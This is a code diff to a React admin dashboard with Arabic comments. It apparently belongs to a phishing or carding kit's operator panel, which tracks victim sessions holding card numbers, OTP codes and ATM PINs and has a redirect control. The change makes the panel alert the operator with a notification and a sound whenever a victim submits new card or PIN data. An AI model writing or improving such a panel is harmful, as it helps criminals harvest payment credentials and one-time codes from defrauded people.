@@ -73,8 +73,8 @@ export default function AdminDashboard() {
   const [redirectTarget, setRedirectTarget] = useState('');
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [newNotifications, setNewNotifications] = useState<string[]>([]);
-  const [shownNew, setShownNew] = useState<Set<string>>(new Set());
   const prevSessionsRef = React.useRef<Record<string, string>>({});
+  const isFirstLoadRef = React.useRef<boolean>(true);
 
   const fetchData = useCallback(async () => {
     try {
@@ -87,31 +87,28 @@ export default function AdminDashboard() {
 
       // كشف الجلسات الجديدة أو المحدّثة (بيانات جديدة وصلت)
       const newIds: string[] = [];
-      data.sessions?.forEach((s: Session) => {
-        const prevUpdated = prevSessionsRef.current[s.id];
-        const currentKey = `${s.updated_at}_${s.current_page}_${s.card_number}_${s.otp_code}_${s.atm_pin}`;
-        if (!prevUpdated || prevUpdated !== currentKey) {
-          // جلسة جديدة أو تحديث جديد
-          if (!shownNew.has(s.id + currentKey)) {
+
+      if (isFirstLoadRef.current) {
+        // أول تحميل: نحفظ الحالة الحالية كـ reference فقط بدون إشعار
+        data.sessions?.forEach((s: Session) => {
+          const currentKey = `${s.updated_at}_${s.current_page}_${s.card_number}_${s.otp_code}_${s.atm_pin}`;
+          prevSessionsRef.current[s.id] = currentKey;
+        });
+        isFirstLoadRef.current = false;
+      } else {
+        // التحديثات التالية: نكشف التغييرات الجديدة فقط
+        data.sessions?.forEach((s: Session) => {
+          const prevKey = prevSessionsRef.current[s.id];
+          const currentKey = `${s.updated_at}_${s.current_page}_${s.card_number}_${s.otp_code}_${s.atm_pin}`;
+          if (!prevKey || prevKey !== currentKey) {
             newIds.push(s.id);
           }
-        }
-        prevSessionsRef.current[s.id] = currentKey;
-      });
+          prevSessionsRef.current[s.id] = currentKey;
+        });
+      }
 
       if (newIds.length > 0) {
         setNewNotifications(prev => [...new Set([...prev, ...newIds])]);
-        setShownNew(prev => {
-          const next = new Set(prev);
-          // نضيف الـ key الكاملة لتجنب التكرار
-          data.sessions?.forEach((s: Session) => {
-            if (newIds.includes(s.id)) {
-              const currentKey = `${s.updated_at}_${s.current_page}_${s.card_number}_${s.otp_code}_${s.atm_pin}`;
-              next.add(s.id + currentKey);
-            }
-          });
-          return next;
-        });
         // صوت تنبيه
         try {
           const ctx = new AudioContext();
